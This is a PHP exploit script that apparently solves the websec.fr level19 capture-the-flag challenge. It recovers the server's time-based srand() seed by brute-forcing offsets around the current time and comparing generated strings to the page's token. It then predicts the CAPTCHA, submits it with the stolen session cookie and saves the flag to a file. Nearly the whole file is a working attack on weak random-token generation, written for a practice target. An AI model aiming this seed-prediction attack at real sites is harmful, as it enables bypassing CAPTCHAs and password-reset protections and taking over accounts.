<?php
error_reporting(0);

// Intentar sin el módulo - tal vez el servidor lo hace diferente
function generate_random_text_v1($length) {
    $chars  = "abcdefghijklmnopqrstuvwxyz";
    $chars .= "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    $chars .= "1234567890";
    $chars_len = strlen($chars);

    $text = '';
    for($i = 0; $i < $length; $i++) {
        $text .= $chars[rand() % $chars_len];
    }
    return $text;
}

// Versión sin módulo explícito
function generate_random_text_v2($length) {
    $chars  = "abcdefghijklmnopqrstuvwxyz";
    $chars .= "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    $chars .= "1234567890";
    $chars_len = strlen($chars);

    $text = '';
    for($i = 0; $i < $length; $i++) {
        $text .= $chars[rand(0, $chars_len - 1)];
    }
    return $text;
}

// Versión usando array_rand
function generate_random_text_v3($length) {
    $chars  = "abcdefghijklmnopqrstuvwxyz";
    $chars .= "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    $chars .= "1234567890";
    $chars_array = str_split($chars);

    $text = '';
    for($i = 0; $i < $length; $i++) {
        $text .= $chars_array[array_rand($chars_array)];
    }
    return $text;
}

echo "╔════════════════════════════════════════════════════════════╗\n";
echo "║    MULTIPLE IMPLEMENTATIONS TEST                           ║\n";
echo "╚════════════════════════════════════════════════════════════╝\n\n";

$round = 0;

while (true) {
    $round++;
    
    $ch = curl_init("https://websec.fr/level19/index.php");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, true);
    $response = curl_exec($ch);
    curl_close($ch);
    
    if (!$response) {
        sleep(1);
        continue;
    }
    
    if (!preg_match('/PHPSESSID=([a-z0-9]+)/i', $response, $matches)) continue;
    $session_id = $matches[1];
    
    $parts = explode("\r\n\r\n", $response, 2);
    $body = isset($parts[1]) ? $parts[1] : $response;
    
    if (!preg_match('/name="token" value="([^"]+)"/', $body, $token_match)) continue;
    $real_token = $token_match[1];
    
    $current_time = time();
    
    echo "[Round $round] " . date('H:i:s') . " | Token: " . substr($real_token, 0, 10) . "...\n";
    
    // Probar diferentes implementaciones
    for ($offset = -600; $offset <= 600; $offset++) {
        $seed = $current_time + $offset;
        
        // V1: Con módulo (versión original)
        srand($seed);
        $test_v1 = generate_random_text_v1(32);
        
        if ($test_v1 === $real_token) {
            echo "\n✓✓✓ MATCH WITH V1 (modulo)! ✓✓✓\n";
            echo "Seed: $seed\n";
            
            srand($seed);
            generate_random_text_v1(32);
            $captcha = generate_random_text_v1(25);
            
            echo "CAPTCHA: $captcha\n";
            
            $post_data = http_build_query([
                'captcha' => $captcha,
                'token' => $real_token,
                'submit' => ''
            ]);
            
            $ch = curl_init("https://websec.fr/level19/index.php");
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
            curl_setopt($ch, CURLOPT_COOKIE, "PHPSESSID=" . $session_id);
            $result = curl_exec($ch);
            curl_close($ch);
            
            if (strpos($result, 'Password recovery email sent') !== false) {
                if (preg_match('/WEBSEC\{[^}]+\}/', $result, $flag_match)) {
                    echo "\nSUCCESS! FLAG: " . $flag_match[0] . "\n";
                    file_put_contents('/workspace/websec_level19/FLAG.txt', $flag_match[0] . "\n");
                    exit(0);
                }
            }
            break;
        }
        
        // V2: Sin módulo explícito
        srand($seed);
        $test_v2 = generate_random_text_v2(32);
        
        if ($test_v2 === $real_token) {
            echo "\n✓✓✓ MATCH WITH V2 (rand with bounds)! ✓✓✓\n";
            echo "Seed: $seed\n";
            
            srand($seed);
            generate_random_text_v2(32);
            $captcha = generate_random_text_v2(25);
            
            echo "CAPTCHA: $captcha\n";
            
            $post_data = http_build_query([
                'captcha' => $captcha,
                'token' => $real_token,
                'submit' => ''
            ]);
            
            $ch = curl_init("https://websec.fr/level19/index.php");
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
            curl_setopt($ch, CURLOPT_COOKIE, "PHPSESSID=" . $session_id);
            $result = curl_exec($ch);
            curl_close($ch);
            
            if (strpos($result, 'Password recovery email sent') !== false) {
                if (preg_match('/WEBSEC\{[^}]+\}/', $result, $flag_match)) {
                    echo "\nSUCCESS! FLAG: " . $flag_match[0] . "\n";
                    file_put_contents('/workspace/websec_level19/FLAG.txt', $flag_match[0] . "\n");
                    exit(0);
                }
            }
            break;
        }
    }
    
    usleep(300000);
}
?>